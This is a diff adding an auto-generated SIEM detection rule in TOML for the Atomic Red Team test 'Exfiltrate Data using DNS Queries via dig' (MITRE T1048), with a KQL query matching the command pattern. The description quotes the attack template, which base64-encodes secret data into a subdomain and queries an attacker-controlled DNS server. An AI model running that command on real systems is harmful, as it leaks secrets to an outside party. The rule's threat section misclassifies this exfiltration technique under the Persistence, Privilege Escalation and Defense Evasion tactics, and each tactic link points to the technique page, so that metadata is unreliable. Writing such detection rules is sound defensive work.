@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Exfiltrate Data using DNS Queries via dig' (GUID: a27916da-05f2-4316-a3ee-feec67a437be) of technique T1048 (Exfiltration Over Alternative Protocol). Test Description: This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.. Command/Steps: dig @#{attacker_dns_server} -p #{dns_port} $(echo \\\"#{secret_info}\\\" | base64).google.com\n"
+from = "now-9m"
+rule_id = "3e5909de-dbae-4f1d-90e8-0d128ac1269b"
+language = "kql"
+name = "Atomic Test: T1048 - Exfiltrate Data using DNS Queries via dig"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048/T1048.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1048", "a27916da-05f2-4316-a3ee-feec67a437be", "macos", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*@8.8.8.8*\\\" AND process.command_line : \\\"*$(echo*\\\" AND process.command_line : \\\"*this*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1048"
+name = "Exfiltrate Data using DNS Queries via dig"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+
